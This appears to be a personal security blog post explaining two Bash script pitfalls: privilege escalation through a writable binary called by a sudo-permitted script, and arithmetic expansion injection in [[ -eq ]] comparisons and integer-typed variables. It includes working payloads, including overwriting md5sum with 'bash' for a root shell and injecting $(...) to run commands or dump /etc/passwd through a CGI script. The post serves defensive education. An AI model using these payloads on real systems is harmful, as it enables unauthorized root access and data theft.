---
title: "Interesting Bash Script Pitfalls"
description:  2 interesting vulnerabilities related to bash scripts and other related technologies. Discusses using binaries without specifying full path and Arithmetic Expansion Abuse
date: 2026-04-10T23:38:23-04:00
image: 
tags:
categories:
    - Personal-Research
comments: false
---

1. Today, I would like to blog about two interesting pitfalls when using Bash Scripts, which can lead to initial access or privilege escalation!
2. The first pitfall is using binaries without specifying full path
	1. This occurs if any of the binaries in use by script is writeable by users. 
	2. To be honest, it is Linux Path Abuse privilege escalation technique but from a different perspective.
3. The second pitfall I would like to discuss is Arithmetic Expansion Abuse. It occurs due to how bash does calculations.
4. Bash scripts can be used for privilege escalation and initial access if
	1. It is being run as shell script.
	2. Sudo allows us to run certain shell scripts.
	3. A CGI script is being run on a web server.
## Writeable Binaries in PATH
### Detection
1. A good way to detect is to check each binary directory for writeable binaries. There should not be any by default, unless you're root
```sh
for i in $(echo $PATH | tr ':' '\n'); do find $i -type f -writable; done
```
2. Actually, it is not 100% fool-proof because sudo may use a different path. So double check with `sudo -l`
```
$ sudo -l
Matching Defaults entries for demo on 700109a60338:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User demo may run the following commands on 700109a60338:
    (ALL : ALL) /tmp/md5files.sh
```
### Privilege Escalation
1. Say we have a script like this
```bash
#!/bin/bash

md5sum /etc/hosts
```
- When run, this script will just calculate the MD5 hash of `/etc/hosts`
2. Our user can run this script as sudo
```
$ sudo -l
[sudo] password for demo: 
Matching Defaults entries for demo on 700109a60338:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User demo may run the following commands on 700109a60338:
    (ALL : ALL) /tmp/md5files.sh
```
3. Let's check if `md5sum` in `/usr/bin` is writeable
```
$ find /usr/bin -type f -writable
/usr/bin/md5sum
```
4. We can easily overwrite it like this
```
echo "bash" > /usr/bin/md5sum
```
5. To escalate privileges,
```
$ sudo /tmp/md5files.sh
root@700109a60338:/tmp# 
```
- We are root!
## Arithmetic Expansion
1. Arithmetic expansion occurs when
	1. We compare a variable with a number in `[[]]`
	2. We declare a variable as number, then assign another variable to this variable
2. Apparently, the vulnerability occurs due to how bash interprets arrays. It will try to expand any command in the square bracket.
### Compare a variable with a number in `[[]]`
1. These codes are used to compare input against a number.
```bash
#!/bin/bash

if [[ $1 -eq 0 ]]; then
    echo PASS;
else 
    echo FAIL;
fi
```
OR
```sh
#!/bin/bash

if [[ "$1" -eq 0 ]]; then
    echo PASS;
else 
    echo FAIL;
fi
```
Both of them are vulnerable to arithmetic expansion abuse
2. To abuse,
```
./test.sh 'x[$(whoami >&2)]'
```
Output:
```
kali
PASS
```
3. Another example: Bash as CGI script
```sh
#!/bin/bash
printf "Content-type: text\n\n"
read PARAMS
NUM="${PARAMS#num=}"
if [[ "$NUM" -eq 100 ]];then
  echo "OK"
else
  echo "NG"
fi
```
Can be easily exploited with
```
$ curl -d num='x[$(cat /etc/passwd > /proc/$$/fd/1)]' http://localhost
/index.cgi
```
### Declare a variable as number, then assign another variable to this variable
1. Example
```sh
#!/bin/bash
typeset -i b # declare "b" as integer type ("typeset" is same as "declare")
a=5
b="$1"
echo "$a"
```
2. To exploit it,
```
./setEnv.sh 'x[$(id >&2)]'
uid=1000(kali) gid=1000(kali) groups=1000(kali)
5
```
3. In addition, we can also modify the environment/ bash variables.
```
./setEnv.sh a=10          
10
```
## Reference
1. https://dev.to/greymd/eq-can-be-critically-vulnerable-338m
2. https://mywiki.wooledge.org/BashPitfalls
3. https://www.nccgroup.com/research/shell-arithmetic-expansion-and-evaluation-abuse
4. https://unix.stackexchange.com/questions/172103/security-implications-of-using-unsanitized-data-in-shell-arithmetic-evaluation